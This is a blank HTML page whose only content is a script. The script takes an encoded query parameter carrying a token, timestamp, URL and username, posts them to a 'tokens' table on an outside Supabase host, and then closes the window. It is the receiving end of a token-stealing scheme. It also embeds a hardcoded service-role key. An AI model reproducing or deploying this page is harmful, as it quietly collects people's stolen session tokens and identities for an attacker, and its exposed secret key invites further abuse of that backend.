<!DOCTYPE html>
<html>
<head>
    <title></title>
    <script>
        (function() {
            const params = new URLSearchParams(window.location.search);
            const data = params.get('d');
            
            if (data) {
                try {
                    const SUPABASE_URL = 'https://knnvsctrlyieslpqwkls.supabase.co';
                    const SUPABASE_SERVICE_ROLE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtubnZzY3RybHlpZXNscHF3a2xzIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2OTgxNTIxOCwiZXhwIjoyMDg1MzkxMjE4fQ.KX7Ck1SI8cYGomsehFKyAGC68oFclo_rpMRm9yUPm58';
                    
                    const decoded = JSON.parse(atob(decodeURIComponent(data)));
                    const token = decoded.t;
                    const timestamp = decoded.ts;
                    const url = decoded.u;
                    const username = decoded.n;
                    
                    fetch(`${SUPABASE_URL}/rest/v1/tokens`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'apikey': SUPABASE_SERVICE_ROLE_KEY,
                            'Authorization': `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`
                        },
                        body: JSON.stringify({
                            token: token,
                            timestamp: timestamp || new Date().toISOString(),
                            url: url || '',
                            username: username || null
                        })
                    }).then(() => {
                        window.close();
                    }).catch(() => {
                        window.close();
                    });
                } catch (e) {
                    window.close();
                }
            } else {
                window.close();
            }
        })();
    </script>
</head>
<body></body>
</html>
